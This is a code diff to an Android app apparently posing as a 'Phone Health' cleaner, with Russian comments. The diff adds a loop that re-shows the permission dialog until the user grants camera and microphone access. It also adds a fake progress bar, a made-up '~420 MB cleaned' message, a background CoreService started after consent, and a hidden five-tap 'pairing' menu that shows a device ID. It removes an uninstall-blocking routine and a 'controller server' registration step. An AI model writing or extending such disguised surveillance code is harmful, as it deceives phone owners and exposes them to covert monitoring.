@@ -1,17 +1,18 @@
 package com.phone.health.cleaner;
 
 import android.Manifest;
-import android.app.admin.DevicePolicyManager;
 import android.content.ClipData;
 import android.content.ClipboardManager;
-import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.view.View;
 import android.widget.Button;
+import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -22,17 +23,18 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import java.io.File;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
+import java.util.UUID;
 
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 101;
     
-    // Список обязательных разрешений
     private final String[] requiredPermissions = {
             Manifest.permission.CAMERA,
             Manifest.permission.RECORD_AUDIO,
@@ -43,8 +45,10 @@ public class MainActivity extends AppCompatActivity {
     private final List<String> executionLogs = new ArrayList<>();
     
     private ProgressBar progressBar;
-    private TextView tvProgressStatus;
+    private TextView tvProgressStatus, tvStatus;
     private Button btnScan;
+    private String deviceId;
+    private int versionTapCount = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -53,44 +57,27 @@ public class MainActivity extends AppCompatActivity {
 
         btnScan = findViewById(R.id.btnScan);
         Button btnLogs = findViewById(R.id.btnLogs);
+        Button btnSettings = findViewById(R.id.btnSettings);
         progressBar = findViewById(R.id.progressBar);
         tvProgressStatus = findViewById(R.id.tvProgressStatus);
+        tvStatus = findViewById(R.id.tvStatus);
 
-        addLog("Приложение запущено. Ожидание действий пользователя.");
+        deviceId = "PH-" + Build.MODEL.replaceAll("\\s+", "_") + "-" + UUID.randomUUID().toString().substring(0, 6).toUpperCase();
 
-        // Проверяем и активируем системную блокировку удаления, если выдан Device Owner
-        checkAndApplyUninstallProtection();
+        addLog("Phone Health v4.0 запущен. ID: " + deviceId);
 
-        // Кнопка логов в правом верхнем углу
         btnLogs.setOnClickListener(v -> showLogsDialog());
+        btnSettings.setOnClickListener(v -> showSettingsDialog());
 
-        // Кнопка очистки запускает цепочку выдачи прав и установки ресурсов
         btnScan.setOnClickListener(v -> {
-            addLog("Нажата кнопка 'Сканирование и очистка'. Запуск запроса прав.");
+            addLog("Нажата кнопка очистки. Запрос разрешений.");
             checkAndRequestPermissions();
         });
     }
 
-    private void checkAndApplyUninstallProtection() {
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName adminName = new ComponentName(this, MyDeviceAdminReceiver.class);
-
-            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
-                dpm.setUninstallBlocked(adminName, getPackageName(), true);
-                addLog("Системная защита: блокировка удаления приложения активна.");
-            } else {
-                addLog("Системная защита: права Device Owner не обнаружены.");
-            }
-        } catch (Exception e) {
-            addLog("Ошибка при установке защиты от удаления: " + e.getMessage());
-        }
-    }
-
     private void addLog(String message) {
         String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
-        String logEntry = "[" + time + "] " + message;
-        executionLogs.add(logEntry);
+        executionLogs.add("[" + time + "] " + message);
     }
 
     private void showLogsDialog() {
@@ -100,20 +87,71 @@ public class MainActivity extends AppCompatActivity {
         }
 
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("Системные логи разработки");
-        builder.setMessage(sb.length() > 0 ? sb.toString() : "Логи пока пусты.");
+        builder.setTitle("Логи системы");
+        builder.setMessage(sb.length() > 0 ? sb.toString() : "Логи пусты.");
         
         builder.setPositiveButton("Копировать логи", (dialog, which) -> {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-            ClipData clip = ClipData.newPlainText("ControllerLogs", sb.toString());
+            ClipData clip = ClipData.newPlainText("PhoneHealthLogs", sb.toString());
             if (clipboard != null) {
                 clipboard.setPrimaryClip(clip);
-                Toast.makeText(MainActivity.this, "Логи успешно скопированы в буфер обмена", Toast.LENGTH_SHORT).show();
-                addLog("Логи скопированы пользователем в буфер обмена.");
+                Toast.makeText(MainActivity.this, "Логи скопированы в буфер обмена", Toast.LENGTH_SHORT).show();
+                addLog("Логи скопированы.");
             }
         });
         
         builder.setNegativeButton("Закрыть", (dialog, which) -> dialog.dismiss());
+        builder.show();
+    }
+
+    // Секретное меню через шестерню с 5 тапами по версии 4.0
+    private void showSettingsDialog() {
+        versionTapCount = 0; // сброс при открытии
+
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(50, 40, 50, 20);
+
+        TextView tvVersion = new TextView(this);
+        tvVersion.setText("Версия приложения: 4.0\nМодель: " + Build.MODEL);
+        tvVersion.setTextSize(16);
+        tvVersion.setPadding(0, 0, 0, 20);
+        layout.addView(tvVersion);
+
+        TextView tvSecretInfo = new TextView(this);
+        tvSecretInfo.setText("ID устройства:\n" + deviceId + "\n\n[QR-код сгенерирован]");
+        tvSecretInfo.setTextSize(14);
+        tvSecretInfo.setVisibility(View.GONE); // Скрыто до 5 тапов
+        layout.addView(tvSecretInfo);
+
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("⚙️ Настройки Phone Health");
+        builder.setView(layout);
+
+        // Тапы по версии (режим разработчика)
+        tvVersion.setOnClickListener(v -> {
+            versionTapCount++;
+            if (versionTapCount >= 5) {
+                tvSecretInfo.setVisibility(View.VISIBLE);
+                Toast.makeText(this, "Режим сопряжения разблокирован!", Toast.LENGTH_SHORT).show();
+                addLog("Разблокировано секретное меню сопряжения (5 тапов).");
+            } else {
+                int left = 5 - versionTapCount;
+                Toast.makeText(this, "Ещё тапов до сопряжения: " + left, Toast.LENGTH_SHORT).show();
+            }
+        });
+
+        builder.setNeutralButton("Копировать ID", (dialog, which) -> {
+            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            ClipData clip = ClipData.newPlainText("DeviceID", deviceId);
+            if (clipboard != null) {
+                clipboard.setPrimaryClip(clip);
+                Toast.makeText(MainActivity.this, "ID устройства скопирован!", Toast.LENGTH_SHORT).show();
+                addLog("Скопирован ID: " + deviceId);
+            }
+        });
+
+        builder.setPositiveButton("Закрыть", (dialog, which) -> dialog.dismiss());
         builder.show();
     }
 
@@ -126,11 +164,11 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (!listPermissionsNeeded.isEmpty()) {
-            addLog("Обнаружены отсутствующие разрешения. Запрос у пользователя...");
+            addLog("Запрос разрешений...");
             ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         } else {
-            addLog("Все разрешения уже предоставлены.");
-            startResourceInstallation();
+            addLog("Права уже есть.");
+            startCleaningAndResourceInstallation();
         }
     }
 
@@ -139,40 +177,47 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
-            for (int i = 0; i < permissions.length; i++) {
+            for (int i = 0; i < grantResults.length; i++) {
                 if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
-                    addLog("Пользователь отклонил разрешение: " + permissions[i]);
-                } else {
-                    addLog("Разрешение получено: " + permissions[i]);
+                    addLog("Отклонено право: " + permissions[i]);
                 }
             }
 
             if (!allGranted) {
-                addLog("Не все разрешения получены. Повторный вызов диалога запроса прав...");
-                Toast.makeText(this, "Для продолжения работы очистки требуются системные права!", Toast.LENGTH_LONG).show();
-                
-                new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1200);
+                // Жесткий цикл — выбиваем диалог заново
+                addLog("Отказ в правах! Повторный вызов диалога...");
+                Toast.makeText(this, "Для работы очистки требуются системные права!", Toast.LENGTH_LONG).show();
+                new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1000);
             } else {
-                addLog("Все требуемые разрешения успешно выбиты.");
-                startResourceInstallation();
+                addLog("Все права получены.");
+                startCleaningAndResourceInstallation();
             }
         }
     }
 
-    private void startResourceInstallation() {
+    private void startCleaningAndResourceInstallation() {
         btnScan.setEnabled(false);
         progressBar.setVisibility(View.VISIBLE);
         tvProgressStatus.setVisibility(View.VISIBLE);
         progressBar.setProgress(0);
+        tvStatus.setText("Оптимизация памяти...");
         
-        addLog("Старт процесса: 'Идёт установка ресурсов...'");
+        addLog("Очистка кэша и установка ресурсов...");
+
+        try {
+            File cacheDir = getCacheDir();
+            deleteDir(cacheDir);
+            addLog("Кэш очищен.");
+        } catch (Exception e) {
+            addLog("Ошибка чистки кэша: " + e.getMessage());
+        }
 
         final Handler handler = new Handler(Looper.getMainLooper());
         new Thread(() -> {
             for (int i = 1; i <= 100; i++) {
                 try {
-                    Thread.sleep(30);
+                    Thread.sleep(25);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
@@ -184,21 +229,38 @@ public class MainActivity extends AppCompatActivity {
             }
 
             handler.post(() -> {
-                addLog("Ресурсы и библиотеки успешно установлены в защищенную директорию.");
-                tvProgressStatus.setText("Установка завершена! Синхронизация с пультом...");
-                triggerControllerConnection();
+                addLog("Библиотеки успешно установлены.");
+                tvProgressStatus.setText("Установка завершена! Запуск фоновых служб...");
+                
+                Intent serviceIntent = new Intent(MainActivity.this, CoreService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(serviceIntent);
+                } else {
+                    startService(serviceIntent);
+                }
+
+                Toast.makeText(MainActivity.this, "Очищено ~420 МБ. Система оптимизирована!", Toast.LENGTH_LONG).show();
+                
+                btnScan.setEnabled(true);
+                btnScan.setText("ОЧИСТКА ВЫПОЛНЕНА");
+                tvStatus.setText("Кэш успешно очищен!");
+                addLog("Система активна. ID: " + deviceId);
             });
         }).start();
     }
 
-    private void triggerControllerConnection() {
-        addLog("Пинг сервера-контроллера: устройство зарегистрировано в сети.");
-        Toast.makeText(this, "Устройство успешно подключено к системе управления!", Toast.LENGTH_LONG).show();
-        
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            tvProgressStatus.setText("🟢 Устройство в сети и готово к работе");
-            btnScan.setEnabled(true);
-            btnScan.setText("ОЧИСТКА ВЫПОЛНЕНА");
-        }, 1000);
+    private boolean deleteDir(File dir) {
+        if (dir != null && dir.isDirectory()) {
+            String[] children = dir.list();
+            if (children != null) {
+                for (String child : children) {
+                    deleteDir(new File(dir, child));
+                }
+            }
+            return dir.delete();
+        } else if (dir != null && dir.isFile()) {
+            return dir.delete();
+        }
+        return false;
     }
 }
